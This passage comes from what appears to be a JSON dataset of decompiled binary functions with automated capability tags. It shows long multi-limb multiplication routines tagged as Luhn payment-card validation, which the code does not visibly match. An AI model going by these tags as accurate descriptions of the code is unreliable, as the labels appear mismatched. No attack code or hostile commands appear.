0x1f);\n    iVar6 = fcn.00410d10(*arg_ch, *arg_ch >> 0x1f, arg_10h[0xc], arg_10h[0xc] >> 0x1f);\n    iVar2 = fcn.00410d10(arg_ch[0xc], arg_ch[0xc] >> 0x1f, *arg_10h, *arg_10h >> 0x1f);\n    iVar2 = iVar3 + iVar4 + iVar5 + iVar6 + iVar2;\n    arg_8h[0xc] = iVar2;\n    arg_8h[0xd] = iVar2 >> 0x20;\n    iVar3 = fcn.00410d10(arg_ch[6], arg_ch[6] >> 0x1f, arg_10h[8], arg_10h[8] >> 0x1f);\n    iVar4 = fcn.00410d10(arg_ch[8], arg_ch[8] >> 0x1f, arg_10h[6], arg_10h[6] >> 0x1f);\n    iVar5 = fcn.00410d10(arg_ch[4], arg_ch[4] >> 0x1f, arg_10h[10], arg_10h[10] >> 0x1f);\n    iVar6 = fcn.00410d10(arg_ch[10], arg_ch[10] >> 0x1f, arg_10h[4], arg_10h[4] >> 0x1f);\n    iVar7 = fcn.00410d10(arg_ch[2], arg_ch[2] >> 0x1f, arg_10h[0xc], arg_10h[0xc] >> 0x1f);\n    iVar8 = fcn.00410d10(arg_ch[0xc], arg_ch[0xc] >> 0x1f, arg_10h[2], arg_10h[2] >> 0x1f);\n    iVar9 = fcn.00410d10(*arg_ch, *arg_ch >> 0x1f, arg_10h[0xe], arg_10h[0xe] >> 0x1f);\n    iVar2 = fcn.00410d10(arg_ch[0xe], arg_ch[0xe] >> 0x1f, *arg_10h, *arg_10h >> 0x1f);\n    iVar2 = iVar3 + iVar4 + iVar5 + iVar6 + iVar7 + iVar8 + iVar9 + iVar2;\n    arg_8h[0xe] = iVar2;\n    arg_8h[0xf] = iVar2 >> 0x20;\n    iVar3 = fcn.00410d10(arg_ch[8], arg_ch[8] >> 0x1f, arg_10h[8], arg_10h[8] >> 0x1f);\n    iVar2 = fcn.00410d10(arg_ch[6], arg_ch[6] >> 0x1f, arg_10h[10], arg_10h[10] >> 0x1f);\n    iVar4 = fcn.00410d10(arg_ch[10], arg_ch[10] >> 0x1f, arg_10h[6], arg_10h[6] >> 0x1f);\n    iVar5 = fcn.00410d10(arg_ch[2], arg_ch[2] >> 0x1f, arg_10h[0xe], arg_10h[0xe] >> 0x1f);\n    iVar6 = fcn.00410d10(arg_ch[0xe], arg_ch[0xe] >> 0x1f, arg_10h[2], arg_10h[2] >> 0x1f);\n    iVar4 = fcn.00410d10(iVar2 + iVar4 + iVar5 + iVar6, 2, 0);\n    iVar5 = fcn.00410d10(arg_ch[4], arg_ch[4] >> 0x1f, arg_10h[0xc], arg_10h[0xc] >> 0x1f);\n    iVar6 = fcn.00410d10(arg_ch[0xc], arg_ch[0xc] >> 0x1f, arg_10h[4], arg_10h[4] >> 0x1f);\n    iVar7 = fcn.00410d10(*arg_ch, *arg_ch >> 0x1f, arg_10h[0x10], arg_10h[0x10] >> 0x1f);\n    iVar2 = fcn.00410d10(arg_ch[0x10], arg_ch[0x10] >> 0x1f, *arg_10h, *arg_10h >> 0x1f);\n    iVar2 = iVar3 + iVar4 + iVar5 + iVar6 + iVar7 + iVar2;\n    arg_8h[0x10] = iVar2;\n    arg_8h[0x11] = iVar2 >> 0x20;\n    iVar3 = fcn.00410d10(arg_ch[8], arg_ch[8] >> 0x1f, arg_10h[10], arg_10h[10] >> 0x1f);\n    iVar4 = fcn.00410d10(arg_ch[10], arg_ch[10] >> 0x1f, arg_10h[8], arg_10h[8] >> 0x1f);\n    iVar5 = fcn.00410d10(arg_ch[6], arg_ch[6] >> 0x1f, arg_10h[0xc], arg_10h[0xc] >> 0x1f);\n    iVar6 = fcn.00410d10(arg_ch[0xc], arg_ch[0xc] >> 0x1f, arg_10h[6], arg_10h[6] >> 0x1f);\n    iVar7 = fcn.00410d10(arg_ch[4], arg_ch[4] >> 0x1f, arg_10h[0xe], arg_10h[0xe] >> 0x1f);\n    iVar8 = fcn.00410d10(arg_ch[0xe], arg_ch[0xe] >> 0x1f, arg_10h[4], arg_10h[4] >> 0x1f);\n    iVar9 = fcn.00410d10(arg_ch[2], arg_ch[2] >> 0x1f, arg_10h[0x10], arg_10h[0x10] >> 0x1f);\n    iVar10 = fcn.00410d10(arg_ch[0x10], arg_ch[0x10] >> 0x1f, arg_10h[2], arg_10h[2] >> 0x1f);\n    iVar11 = fcn.00410d10(*arg_ch, *arg_ch >> 0x1f, arg_10h[0x12], arg_10h[0x12] >> 0x1f);\n    iVar2 = fcn.00410d10(arg_ch[0x12], arg_ch[0x12] >> 0x1f, *arg_10h, *arg_10h >> 0x1f);\n    iVar2 = iVar3 + iVar4 + iVar5 + iVar6 + iVar7 + iVar8 + iVar9 + iVar10 + iVar11 + iVar2;\n    arg_8h[0x12] = iVar2;\n    arg_8h[0x13] = iVar2 >> 0x20;\n    iVar2 = fcn.00410d10(arg_ch[10], arg_ch[10] >> 0x1f, arg_10h[10], arg_10h[10] >> 0x1f);\n    iVar3 = fcn.00410d10(arg_ch[6], arg_ch[6] >> 0x1f, arg_10h[0xe], arg_10h[0xe] >> 0x1f);\n    iVar4 = fcn.00410d10(arg_ch[0xe], arg_ch[0xe] >> 0x1f, arg_10h[6], arg_10h[6] >> 0x1f);\n    iVar5 = fcn.00410d10(arg_ch[2], arg_ch[2] >> 0x1f, arg_10h[0x12], arg_10h[0x12] >> 0x1f);\n    iVar6 = fcn.00410d10(arg_ch[0x12], arg_ch[0x12] >> 0x1f, arg_10h[2], arg_10h[2] >> 0x1f);\n    iVar3 = fcn.00410d10(iVar2 + iVar3 + iVar4 + iVar5 + iVar6, 2, 0);\n    iVar4 = fcn.00410d10(arg_ch[8], arg_ch[8] >> 0x1f, arg_10h[0xc], arg_10h[0xc] >> 0x1f);\n    iVar5 = fcn.00410d10(arg_ch[0xc], arg_ch[0xc] >> 0x1f, arg_10h[8], arg_10h[8] >> 0x1f);\n    iVar6 = fcn.00410d10(arg_ch[4], arg_ch[4] >> 0x1f, arg_10h[0x10], arg_10h[0x10] >> 0x1f);\n    iVar2 = fcn.00410d10(arg_ch[0x10], arg_ch[0x10] >> 0x1f, arg_10h[4], arg_10h[4] >> 0x1f);\n    iVar2 = iVar3 + iVar4 + iVar5 + iVar6 + iVar2;\n    arg_8h[0x14] = iVar2;\n    arg_8h[0x15] = iVar2 >> 0x20;\n    iVar3 = fcn.00410d10(arg_ch[10], arg_ch[10] >> 0x1f, arg_10h[0xc], arg_10h[0xc] >> 0x1f);\n    iVar4 = fcn.00410d10(arg_ch[0xc], arg_ch[0xc] >> 0x1f, arg_10h[10], arg_10h[10] >> 0x1f);\n    iVar5 = fcn.00410d10(arg_ch[8], arg_ch[8] >> 0x1f, arg_10h[0xe], arg_10h[0xe] >> 0x1f);\n    iVar6 = fcn.00410d10(arg_ch[0xe], arg_ch[0xe] >> 0x1f, arg_10h[8], arg_10h[8] >> 0x1f);\n    iVar7 = fcn.00410d10(arg_ch[6], arg_ch[6] >> 0x1f, arg_10h[0x10], arg_10h[0x10] >> 0x1f);\n    iVar8 = fcn.00410d10(arg_ch[0x10], arg_ch[0x10] >> 0x1f, arg_10h[6], arg_10h[6] >> 0x1f);\n    iVar9 = fcn.00410d10(arg_ch[4], arg_ch[4] >> 0x1f, arg_10h[0x12], arg_10h[0x12] >> 0x1f);\n    iVar2 = fcn.00410d10(arg_ch[0x12], arg_ch[0x12] >> 0x1f, arg_10h[4], arg_10h[4] >> 0x1f);\n    iVar2 = iVar3 + iVar4 + iVar5 + iVar6 + iVar7 + iVar8 + iVar9 + iVar2;\n    arg_8h[0x16] = iVar2;\n    arg_8h[0x17] = iVar2 >> 0x20;\n    iVar3 = fcn.00410d10(arg_ch[0xc], arg_ch[0xc] >> 0x1f, arg_10h[0xc], arg_10h[0xc] >> 0x1f);\n    iVar2 = fcn.00410d10(arg_ch[10], arg_ch[10] >> 0x1f, arg_10h[0xe], arg_10h[0xe] >> 0x1f);\n    iVar4 = fcn.00410d10(arg_ch[0xe], arg_ch[0xe] >> 0x1f, arg_10h[10], arg_10h[10] >> 0x1f);\n    iVar5 = fcn.00410d10(arg_ch[6], arg_ch[6] >> 0x1f, arg_10h[0x12], arg_10h[0x12] >> 0x1f);\n    iVar6 = fcn.00410d10(arg_ch[0x12], arg_ch[0x12] >> 0x1f, arg_10h[6], arg_10h[6] >> 0x1f);\n    iVar4 = fcn.00410d10(iVar2 + iVar4 + iVar5 + iVar6, 2, 0);\n    iVar5 = fcn.00410d10(arg_ch[8], arg_ch[8] >> 0x1f, arg_10h[0x10], arg_10h[0x10] >> 0x1f);\n    iVar2 = fcn.00410d10(arg_ch[0x10], arg_ch[0x10] >> 0x1f, arg_10h[8], arg_10h[8] >> 0x1f);\n    iVar2 = iVar3 + iVar4 + iVar5 + iVar2;\n    arg_8h[0x18] = iVar2;\n    arg_8h[0x19] = iVar2 >> 0x20;\n    iVar3 = fcn.00410d10(arg_ch[0xc], arg_ch[0xc] >> 0x1f, arg_10h[0xe], arg_10h[0xe] >> 0x1f);\n    iVar4 = fcn.00410d10(arg_ch[0xe], arg_ch[0xe] >> 0x1f, arg_10h[0xc], arg_10h[0xc] >> 0x1f);\n    iVar5 = fcn.00410d10(arg_ch[10], arg_ch[10] >> 0x1f, arg_10h[0x10], arg_10h[0x10] >> 0x1f);\n    iVar6 = fcn.00410d10(arg_ch[0x10], arg_ch[0x10] >> 0x1f, arg_10h[10], arg_10h[10] >> 0x1f);\n    iVar7 = fcn.00410d10(arg_ch[8], arg_ch[8] >> 0x1f, arg_10h[0x12], arg_10h[0x12] >> 0x1f);\n    iVar2 = fcn.00410d10(arg_ch[0x12], arg_ch[0x12] >> 0x1f, arg_10h[8], arg_10h[8] >> 0x1f);\n    iVar2 = iVar3 + iVar4 + iVar5 + iVar6 + iVar7 + iVar2;\n    arg_8h[0x1a] = iVar2;\n    arg_8h[0x1b] = iVar2 >> 0x20;\n    iVar2 = fcn.00410d10(arg_ch[0xe], arg_ch[0xe] >> 0x1f, arg_10h[0xe], arg_10h[0xe] >> 0x1f);\n    iVar3 = fcn.00410d10(arg_ch[10], arg_ch[10] >> 0x1f, arg_10h[0x12], arg_10h[0x12] >> 0x1f);\n    iVar4 = fcn.00410d10(arg_ch[0x12], arg_ch[0x12] >> 0x1f, arg_10h[10], arg_10h[10] >> 0x1f);\n    iVar3 = fcn.00410d10(iVar2 + iVar3 + iVar4, 2, 0);\n    iVar4 = fcn.00410d10(arg_ch[0xc], arg_ch[0xc] >> 0x1f, arg_10h[0x10], arg_10h[0x10] >> 0x1f);\n    iVar2 = fcn.00410d10(arg_ch[0x10], arg_ch[0x10] >> 0x1f, arg_10h[0xc], arg_10h[0xc] >> 0x1f);\n    iVar2 = iVar3 + iVar4 + iVar2;\n    arg_8h[0x1c] = iVar2;\n    arg_8h[0x1d] = iVar2 >> 0x20;\n    iVar3 = fcn.00410d10(arg_ch[0xe], arg_ch[0xe] >> 0x1f, arg_10h[0x10], arg_10h[0x10] >> 0x1f);\n    iVar4 = fcn.00410d10(arg_ch[0x10], arg_ch[0x10] >> 0x1f, arg_10h[0xe], arg_10h[0xe] >> 0x1f);\n    iVar5 = fcn.00410d10(arg_ch[0xc], arg_ch[0xc] >> 0x1f, arg_10h[0x12], arg_10h[0x12] >> 0x1f);\n    iVar2 = fcn.00410d10(arg_ch[0x12], arg_ch[0x12] >> 0x1f, arg_10h[0xc], arg_10h[0xc] >> 0x1f);\n    iVar2 = iVar3 + iVar4 + iVar5 + iVar2;\n    arg_8h[0x1e] = iVar2;\n    arg_8h[0x1f] = iVar2 >> 0x20;\n    iVar2 = fcn.00410d10(arg_ch[0x10], arg_ch[0x10] >> 0x1f, arg_10h[0x10], arg_10h[0x10] >> 0x1f);\n    iVar3 = fcn.00410d10(arg_ch[0xe], arg_ch[0xe] >> 0x1f, arg_10h[0x12], arg_10h[0x12] >> 0x1f);\n    iVar4 = fcn.00410d10(arg_ch[0x12], arg_ch[0x12] >> 0x1f, arg_10h[0xe], arg_10h[0xe] >> 0x1f);\n    iVar3 = fcn.00410d10(iVar3 + iVar4, 2, 0);\n    arg_8h[0x20] = iVar2 + iVar3;\n    arg_8h[0x21] = iVar2 + iVar3 >> 0x20;\n    iVar2 = fcn.00410d10(arg_ch[0x10], arg_ch[0x10] >> 0x1f, arg_10h[0x12], arg_10h[0x12] >> 0x1f);\n    iVar3 = fcn.00410d10(arg_ch[0x12], arg_ch[0x12] >> 0x1f, arg_10h[0x10], arg_10h[0x10] >> 0x1f);\n    arg_8h[0x22] = iVar2 + iVar3;\n    arg_8h[0x23] = iVar2 + iVar3 >> 0x20;\n    uVar1 = fcn.00410d10(arg_ch[0x12], arg_ch[0x12] >> 0x1f, 2, 0);\n    uVar1 = fcn.00410d10(uVar1, arg_10h[0x12], arg_10h[0x12] >> 0x1f);\n    arg_8h[0x24] = uVar1;\n    arg_8h[0x25] = uVar1 >> 0x20;\n    return;\n}\n",
        "token_count": 6456
    },
    "00403690": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403690(uint32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    ulong uVar2;\n    \n    uVar2 = fcn.00410d50();\n    uVar1 = arg_8h[0x10];\n    arg_8h[0x10] = uVar2 + arg_8h[0x10];\n    arg_8h[0x11] = (uVar2 >> 0x20) + arg_8h[0x11] + CARRY4(uVar2, uVar1);\n    uVar2 = fcn.00410d50();\n    uVar1 = arg_8h[0x10];\n    arg_8h[0x10] = uVar2 + arg_8h[0x10];\n    arg_8h[0x11] = (uVar2 >> 0x20) + arg_8h[0x11] + CARRY4(uVar2, uVar1);\n    uVar1 = arg_8h[0x10];\n    arg_8h[0x10] = uVar1 + arg_8h[0x24];\n    arg_8h[0x11] = arg_8h[0x11] + arg_8h[0x25] + CARRY4(uVar1, arg_8h[0x24]);\n    uVar2 = fcn.00410d50();\n    uVar1 = arg_8h[0xe];\n    arg_8h[0xe] = uVar2 + arg_8h[0xe];\n    arg_8h[0xf] = (uVar2 >> 0x20) + arg_8h[0xf] + CARRY4(uVar2, uVar1);\n    uVar2 = fcn.00410d50();\n    uVar1 = arg_8h[0xe];\n    arg_8h[0xe] = uVar2 + arg_8h[0xe];\n    arg_8h[0xf] = (uVar2 >> 0x20) + arg_8h[0xf] + CARRY4(uVar2, uVar1);\n    uVar1 = arg_8h[0xe];\n    arg_8h[0xe] = uVar1 + arg_8h[0x22];\n    arg_8h[0xf] = arg_8h[0xf] + arg_8h[0x23] + CARRY4(uVar1, arg_8h[0x22]);\n    uVar2 = fcn.00410d50();\n    uVar1 = arg_8h[0xc];\n    arg_8h[0xc] = uVar2 + arg_8h[0xc];\n    arg_8h[0xd] = (uVar2 >> 0x20) + arg_8h[0xd] + CARRY4(uVar2, uVar1);\n    uVar2 = fcn.00410d50();\n    uVar1 = arg_8h[0xc];\n    arg_8h[0xc] = uVar2 + arg_8h[0xc];\n    arg_8h[0xd] = (uVar2 >> 0x20) + arg_8h[0xd] + CARRY4(uVar2, uVar1);\n    uVar1 = arg_8h[0xc];\n    arg_8h[0xc] = uVar1 + arg_8h[0x20];\n    arg_8h[0xd] = arg_8h[0xd] + arg_8h[0x21] + CARRY4(uVar1, arg_8h[0x20]);\n    uVar2 = fcn.00410d50();\n    uVar1 = arg_8h[10];\n    arg_8h[10] = uVar2 + arg_8h[10];\n    arg_8h[0xb] = (uVar2 >> 0x20) + arg_8h[0xb] + CARRY4(uVar2, uVar1);\n    uVar2 = fcn.00410d50();\n    uVar1 = arg_8h[10];\n    arg_8h[10] = uVar2 + arg_8h[10];\n    arg_8h[0xb] = (uVar2 >> 0x20) + arg_8h[0xb] + CARRY4(uVar2, uVar1);\n    uVar1 = arg_8h[10];\n    arg_8h[10] = uVar1 + arg_8h[0x1e];\n    arg_8h[0xb] = arg_8h[0xb] + arg_8h[0x1f] + CARRY4(uVar1, arg_8h[0x1e]);\n    uVar2 = fcn.00410d50();\n    uVar1 = arg_8h[8];\n    arg_8h[8] = uVar2 + arg_8h[8];\n    arg_8h[9] = (uVar2 >> 0x20) + arg_8h[9] + CARRY4(uVar2, uVar1);\n    uVar2 = fcn.00410d50();\n    uVar1 = arg_8h[8];\n    arg_8h[8] = uVar2 + arg_8h[8];\n    arg_8h[9] = (uVar2 >> 0x20) + arg_8h[9] + CARRY4(uVar2, uVar1);\n    uVar1 = arg_8h[8];\n    arg_8h[8] = uVar1 + arg_8h[0x1c];\n    arg_8h[9] = arg_8h[9] + arg_8h[0x1d] + CARRY4(uVar1, arg_8h[0x1c]);\n    uVar2 = fcn.00410d50();\n    uVar1 = arg_8h[6];\n    arg_8h[6] = uVar2 + arg_8h[6];\n    arg_8h[7] = (uVar2 >> 0x20) + arg_8h[7] + CARRY4(uVar2, uVar1);\n    uVar2 = fcn.00410d50();\n    uVar1 = arg_8h[6];\n    arg_8h[6] = uVar2 + arg_8h[6];\n    arg_8h[7] = (uVar2 >> 0x20) + arg_8h[7] + CARRY4(uVar2, uVar1);\n    uVar1 = arg_8h[6];\n    arg_8h[6] = uVar1 + arg_8h[0x1a];\n    arg_8h[7] = arg_8h[7] + arg_8h[0x1b] + CARRY4(uVar1, arg_8h[0x1a]);\n    uVar2 = fcn.00410d50();\n    uVar1 = arg_8h[4];\n    arg_8h[4] = uVar2 + arg_8h[4];\n    arg_8h[5] = (uVar2 >> 0x20) + arg_8h[5] + CARRY4(uVar2, uVar1);\n    uVar2 = fcn.00410d50();\n    uVar1 = arg_8h[4];\n    arg_8h[4] = uVar2 + arg_8h[4];\n    arg_8h[5] = (uVar2 >> 0x20) + arg_8h[5] + CARRY4(uVar2, uVar1);\n    uVar1 = arg_8h[4];\n    arg_8h[4] = uVar1 + arg_8h[0x18];\n    arg_8h[5] = arg_8h[5] + arg_8h[0x19] + CARRY4(uVar1, arg_8h[0x18]);\n    uVar2 = fcn.00410d50();\n    uVar1 = arg_8h[2];\n    arg_8h[2] = uVar2 + arg_8h[2];\n    arg_8h[3] = (uVar2 >> 0x20) + arg_8h[3] + CARRY4(uVar2, uVar1);\n    uVar2 = fcn.00410d50();\n    uVar1 = arg_8h[2];\n    arg_8h[2] = uVar2 + arg_8h[2];\n    arg_8h[3] = (uVar2 >> 0x20) + arg_8h[3] + CARRY4(uVar2, uVar1);\n    uVar1 = arg_8h[2];\n    arg_8h[2] = uVar1 + arg_8h[0x16];\n    arg_8h[3] = arg_8h[3] + arg_8h[0x17] + CARRY4(uVar1, arg_8h[0x16]);\n    uVar2 = fcn.00410d50();\n    uVar1 = *arg_8h;\n    *arg_8h = uVar2 + *arg_8h;\n    arg_8h[1] = (uVar2 >> 0x20) + arg_8h[1] + CARRY4(uVar2, uVar1);\n    uVar2 = fcn.00410d50();\n    uVar1 = *arg_8h;\n    *arg_8h = uVar2 + *arg_8h;\n    arg_8h[1] = (uVar2 >> 0x20) + arg_8h[1] + CARRY4(uVar2, uVar1);\n    uVar1 = *arg_8h;\n    *arg_8h = uVar1 + arg_8h[0x14];\n    arg_8h[1] = arg_8h[1] + arg_8h[0x15] + CARRY4(uVar1, arg_8h[0x14]);\n    return;\n}\n",
        "token_count": 2304
    },
    "00404030": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404030(uint *arg_8h, int32_t *arg_ch)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00410d10(*arg_ch, *arg_ch >> 0x1f, *arg_ch, *arg_ch >> 0x1f);\n    *arg_8h = uVar1;\n    arg_8h[1] = uVar1 >> 0x20;\n    uVar1 = fcn.00410d10(*arg_ch, *arg_ch >> 0x1f, 2, 0);\n    uVar1 = fcn.00410d10(uVar1, arg_ch[2], arg_ch[2] >> 0x1f);\n    arg_8h[2] = uVar1;\n    arg_8h[3] = uVar1 >> 0x20;\n    iVar2 = fcn.00410d10(arg_ch[2], arg_ch[2] >> 0x1f, arg_ch[2], arg_ch[2] >> 0x1f);\n    iVar3 = fcn.00410d10(*arg_ch, *arg_ch >> 0x1f, arg_ch[4], arg_ch[4] >> 0x1f);\n    uVar1 = fcn.00410d10(iVar2 + iVar3, 2, 0);\n    arg_8h[4] = uVar1;\n    arg_8h[5] = uVar1 >> 0x20;\n    iVar2 = fcn.00410d10(arg_ch[2], arg_ch[2] >> 0x1f, arg_ch[4], arg_ch[4] >> 0x1f);\n    iVar3 = fcn.00410d10(*arg_ch, *arg_ch >> 0x1f, arg_ch[6], arg_ch[6] >> 0x1f);\n    uVar1 = fcn.00410d10(iVar2 + iVar3, 2, 0);\n    arg_8h[6] = uVar1;\n    arg_8h[7] = uVar1 >> 0x20;\n    iVar3 = fcn.00410d10(arg_ch[4], arg_ch[4] >> 0x1f, arg_ch[4], arg_ch[4] >> 0x1f);\n    uVar1 = fcn.00410d10(arg_ch[2], arg_ch[2] >> 0x1f, 4, 0);\n    iVar4 = fcn.00410d10(uVar1, arg_ch[6], arg_ch[6] >> 0x1f);\n    uVar1 = fcn.00410d10(*arg_ch, *arg_ch >> 0x1f, 2, 0);\n    iVar2 = fcn.00410d10(uVar1, arg_ch[8], arg_ch[8] >> 0x1f);\n    iVar2 = iVar3 + iVar4 + iVar2;\n    arg_8h[8] = iVar2;\n    arg_8h[9] = iVar2 >> 0x20;\n    iVar2 = fcn.00410d10(arg_ch[4], arg_ch[4] >> 0x1f, arg_ch[6], arg_ch[6] >> 0x1f);\n    iVar3 = fcn.00410d10(arg_ch[2], arg_ch[2] >> 0x1f, arg_ch[8], arg_ch[8] >> 0x1f);\n    iVar4 = fcn.00410d10(*arg_ch, *arg_ch >> 0x1f, arg_ch[10], arg_ch[10] >> 0x1f);\n    uVar1 = fcn.00410d10(iVar2 + iVar3 + iVar4, 2, 0);\n    arg_8h[10] = uVar1;\n    arg_8h[0xb] = uVar1 >> 0x20;\n    iVar2 = fcn.00410d10(arg_ch[6], arg_ch[6] >> 0x1f, arg_ch[6], arg_ch[6] >> 0x1f);\n    iVar3 = fcn.00410d10(arg_ch[4], arg_ch[4] >> 0x1f, arg_ch[8], arg_ch[8] >> 0x1f);\n    iVar4 = fcn.00410d10(*arg_ch, *arg_ch >> 0x1f, arg_ch[0xc], arg_ch[0xc] >> 0x1f);\n    uVar1 = fcn.00410d10(arg_ch[2], arg_ch[2] >> 0x1f, 2, 0);\n    iVar5 = fcn.00410d10(uVar1, arg_ch[10], arg_ch[10] >> 0x1f);\n    uVar1 = fcn.00410d10(iVar2 + iVar3 + iVar4 + iVar5, 2, 0);\n    arg_8h[0xc] = uVar1;\n    arg_8h[0xd] = uVar1 >> 0x20;\n    iVar2 = fcn.00410d10(arg_ch[6], arg_ch[6] >> 0x1f, arg_ch[8], arg_ch[8] >> 0x1f);\n    iVar3 = fcn.00410d10(arg_ch[4], arg_ch[4] >> 0x1f, arg_ch[10], arg_ch[10] >> 0x1f);\n    iVar4 = fcn.00410d10(arg_ch[2], arg_ch[2] >> 0x1f, arg_ch[0xc], arg_ch[0xc] >> 0x1f);\n    iVar5 = fcn.00410d10(*arg_ch, *arg_ch >> 0x1f, arg_ch[0xe], arg_ch[0xe] >> 0x1f);\n    uVar1 = fcn.00410d10(iVar2 + iVar3 + iVar4 + iVar5, 2, 0);\n    arg_8h[0xe] = uVar1;\n    arg_8h[0xf] = uVar1 >> 0x20;\n    iVar2 = fcn.00410d10(arg_ch[8], arg_ch[8] >> 0x1f, arg_ch[8], arg_ch[8] >> 0x1f);\n    iVar3 = fcn.00410d10(arg_ch[4], arg_ch[4] >> 0x1f, arg_ch[0xc], arg_ch[0xc] >> 0x1f);\n    iVar4 = fcn.00410d10(*arg_ch, *arg_ch >> 0x1f, arg_ch[0x10], arg_ch[0x10] >> 0x1f);\n    iVar5 = fcn.00410d10(arg_ch[2], arg_ch[2] >> 0x1f, arg_ch[0xe], arg_ch[0xe] >> 0x1f);\n    iVar6 = fcn.00410d10(arg_ch[6], arg_ch[6] >> 0x1f, arg_ch[10], arg_ch[10] >> 0x1f);\n    iVar5 = fcn.00410d10(iVar5 + iVar6, 2, 0);\n    iVar3 = fcn.00410d10(iVar3 + iVar4 + iVar5, 2, 0);\n    arg_8h[0x10] = iVar2 + iVar3;\n    arg_8h[0x11] = iVar2 + iVar3 >> 0x20;\n    iVar2 = fcn.00410d10(arg_ch[8], arg_ch[8] >> 0x1f, arg_ch[10], arg_ch[10] >> 0x1f);\n    iVar3 = fcn.00410d10(arg_ch[6], arg_ch[6] >> 0x1f, arg_ch[0xc], arg_ch[0xc] >> 0x1f);\n    iVar4 = fcn.00410d10(arg_ch[4], arg_ch[4] >> 0x1f, arg_ch[0xe], arg_ch[0xe] >> 0x1f);\n    iVar5 = fcn.00410d10(arg_ch[2], arg_ch[2] >> 0x1f, arg_ch[0x10], arg_ch[0x10] >> 0x1f);\n    iVar6 = fcn.00410d10(*arg_ch, *arg_ch >> 0x1f, arg_ch[0x12], arg_ch[0x12] >> 0x1f);\n    uVar1 = fcn.00410d10(iVar2 + iVar3 + iVar4 + iVar5 + iVar6, 2, 0);\n    arg_8h[0x12] = uVar1;\n    arg_8h[0x13] = uVar1 >> 0x20;\n    iVar2 = fcn.00410d10(arg_ch[10], arg_ch[10] >> 0x1f, arg_ch[10], arg_ch[10] >> 0x1f);\n    iVar3 = fcn.00410d10(arg_ch[8], arg_ch[8] >> 0x1f, arg_ch[0xc], arg_ch[0xc] >> 0x1f);\n    iVar4 = fcn.00410d10(arg_ch[4], arg_ch[4] >> 0x1f, arg_ch[0x10], arg_ch[0x10] >> 0x1f);\n    iVar5 = fcn.00410d10(arg_ch[6], arg_ch[6] >> 0x1f, arg_ch[0xe], arg_ch[0xe] >> 0x1f);\n    iVar6 = fcn.00410d10(arg_ch[2], arg_ch[2] >> 0x1f, arg_ch[0x12], arg_ch[0x12] >> 0x1f);\n    iVar5 = fcn.00410d10(iVar5 + iVar6, 2, 0);\n    uVar1 = fcn.00410d10(iVar2 + iVar3 + iVar4 + iVar5, 2, 0);\n    arg_8h[0x14] = uVar1;\n    arg_8h[0x15] = uVar1 >> 0x20;\n    iVar2 = fcn.00410d10(arg_ch[10], arg_ch[10] >> 0x1f, arg_ch[0xc], arg_ch[0xc] >> 0x1f);\n    iVar3 = fcn.00410d10(arg_ch[8], arg_ch[8] >> 0x1f, arg_ch[0xe], arg_ch[0xe] >> 0x1f);\n    iVar4 = fcn.00410d10(arg_ch[6], arg_ch[6] >> 0x1f, arg_ch[0x10], arg_ch[0x10] >> 0x1f);\n    iVar5 = fcn.00410d10(arg_ch[4], arg_ch[4] >> 0x1f, arg_ch[0x12], arg_ch[0x12] >> 0x1f);\n    uVar1 = fcn.00410d10(iVar2 + iVar3 + iVar4 + iVar5, 2, 0);\n    arg_8h[0x16] = uVar1;\n    arg_8h[0x17] = uVar1 >> 0x20;\n    iVar2 = fcn.00410d10(arg_ch[0xc], arg_ch[0xc] >> 0x1f, arg_ch[0xc], arg_ch[0xc] >> 0x1f);\n    iVar3 = fcn.00410d10(arg_ch[8], arg_ch[8] >> 0x1f, arg_ch[0x10], arg_ch[0x10] >> 0x1f);\n    iVar4 = fcn.00410d10(arg_ch[10], arg_ch[10] >> 0x1f, arg_ch[0xe], arg_ch[0xe] >> 0x1f);\n    iVar5 = fcn.00410d10(arg_ch[6], arg_ch[6] >> 0x1f, arg_ch[0x12], arg_ch[0x12] >> 0x1f);\n    iVar4 = fcn.00410d10(iVar4 + iVar5, 2, 0);\n    iVar3 = fcn.00410d10(iVar3 + iVar4, 2, 0);\n    arg_8h[0x18] = iVar2 + iVar3;\n    arg_8h[0x19] = iVar2 + iVar3 >> 0x20;\n    iVar2 = fcn.00410d10(arg_ch[0xc], arg_ch[0xc] >> 0x1f, arg_ch[0xe], arg_ch[0xe] >> 0x1f);\n    iVar3 = fcn.00410d10(arg_ch[10], arg_ch[10] >> 0x1f, arg_ch[0x10], arg_ch[0x10] >> 0x1f);\n    iVar4 = fcn.00410d10(arg_ch[8], arg_ch[8] >> 0x1f, arg_ch[0x12], arg_ch[0x12] >> 0x1f);\n    uVar1 = fcn.00410d10(iVar2 + iVar3 + iVar4, 2, 0);\n    arg_8h[0x1a] = uVar1;\n    arg_8h[0x1b] = uVar1 >> 0x20;\n    iVar2 = fcn.00410d10(arg_ch[0xe], arg_ch[0xe] >> 0x1f, arg_ch[0xe], arg_ch[0xe] >> 0x1f);\n    iVar3 = fcn.00410d10(arg_ch[0xc], arg_ch[0xc] >> 0x1f, arg_ch[0x10], arg_ch[0x10] >> 0x1f);\n    uVar1 = fcn.00410d10(arg_ch[10], arg_ch[10] >> 0x1f, 2, 0);\n    iVar4 = fcn.00410d10(uVar1, arg_ch[0x12], arg_ch[0x12] >> 0x1f);\n    uVar1 = fcn.00410d10(iVar2 + iVar3 + iVar4, 2, 0);\n    arg_8h[0x1c] = uVar1;\n    